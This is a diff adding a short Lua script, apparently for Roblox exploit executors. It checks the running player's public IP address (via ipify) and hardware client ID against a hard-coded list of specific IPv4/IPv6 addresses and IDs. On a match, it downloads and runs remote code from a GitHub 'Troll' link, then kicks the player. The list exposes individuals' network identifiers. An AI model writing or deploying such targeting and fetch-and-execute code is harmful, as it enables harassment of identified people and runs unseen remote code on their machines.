@@ -1,0 +1,28 @@
+local Tabela = {
+	"201.51.108.222",          
+	"2804:d4b:9716:1600:87aa:fc8a:5340:f7e5",
+	"d71e9724-2607-4794-a0bd-e55307af04ff",
+	"8f07aea9-e023-4733-97c5-1868c89cf0ec",
+	
+}
+
+local Servico_Hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local Servico_IPv4 = game:HttpGet("https://api.ipify.org") 
+local Servico_IPv6 = game:HttpGet("https://api64.ipify.org")
+
+for _, v in pairs(Tabela) do
+	if v == Servico_IPv4 then
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/SourceRoblox/Loadstring/refs/heads/main/Troll'))()
+		wait(10)
+		game.Players.LocalPlayer:Kick(".")
+	elseif v == Servico_IPv6  then
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/SourceRoblox/Loadstring/refs/heads/main/Troll'))()
+		wait(10)
+		game.Players.LocalPlayer:Kick(".")
+	elseif v == Servico_Hwid then
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/SourceRoblox/Loadstring/refs/heads/main/Troll'))()
+		wait(10)
+		game.Players.LocalPlayer:Kick(".")
+	end
+end
+
